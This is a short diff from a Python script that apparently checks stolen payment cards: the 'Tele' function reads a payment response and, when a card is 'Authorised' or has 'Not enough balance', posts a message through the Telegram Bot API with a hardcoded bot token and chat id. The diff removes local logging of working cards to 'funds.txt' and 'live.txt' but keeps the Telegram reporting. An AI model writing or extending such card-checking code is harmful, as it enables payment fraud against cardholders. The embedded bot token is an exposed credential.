@@ -514,8 +514,6 @@ def Tele(ccx):
                     msg = refusal_match.group(1)
                     if msg == "Not enough balance":
                         msg = "Not enough balance ✅"
-                        with open("funds.txt", "a+") as live_file:
-                            live_file.write(f"{ccx}\n")
                         requests.post(f"""https://api.telegram.org/bot7137717547:AAFRxhQNER3dMfOeCrob5IqsCaDBbWCcfFQ/sendMessage?chat_id=1314540100&text=
                     Not enough balance ✅
                     
@@ -529,8 +527,6 @@ def Tele(ccx):
 
             elif "Authorised" in response.text:
                 msg = "Thank you for your order ✅"
-                with open("live.txt", "a+") as live_file:
-                    live_file.write(f"{ccx}\n")
                 requests.post(f"""https://api.telegram.org/bot7137717547:AAFRxhQNER3dMfOeCrob5IqsCaDBbWCcfFQ/sendMessage?chat_id=1314540100&text=
                     Charge ✅
                     
